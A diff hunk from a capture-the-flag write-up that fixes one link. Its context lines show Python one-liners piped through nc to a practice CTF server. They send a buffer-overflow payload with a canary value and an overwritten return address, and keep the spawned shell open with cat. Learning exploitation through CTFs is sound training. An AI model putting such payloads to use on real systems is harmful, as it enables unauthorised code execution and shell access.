@@ -134,7 +134,7 @@ This works in the debugger, so now we can test it on the server:
 > Note: The above works in Python2. As Python3 uses Unicode for the basic string, and print() expects Unicode, for Python3 use:
 python3 -c "import sys; sys.stdout.buffer.write(b'A'*64 + b'\xef\xbe\xad\xde' + b'A'*12 + b'\x1B\x86\x04\x08')" | nc ctf.hackucf.org 9003
 
-This didn't work because I forgot to use `cat` to ensure we get chance to interact with the shell (see [Gimme Shellcode](../Scripting_GimmeShellcode/README.txt)). I now tried:
+This didn't work because I forgot to use `cat` to ensure we get chance to interact with the shell (see [Gimme Shellcode](../Scripting_GimmeShellcode/README.md)). I now tried:
 ```
 > (python -c "print('A'*64 + '\xef\xbe\xad\xde' + 'A'*12 + '\x1B\x86\x04\x08')" ; cat) | nc ctf.hackucf.org 9003
 you Win!
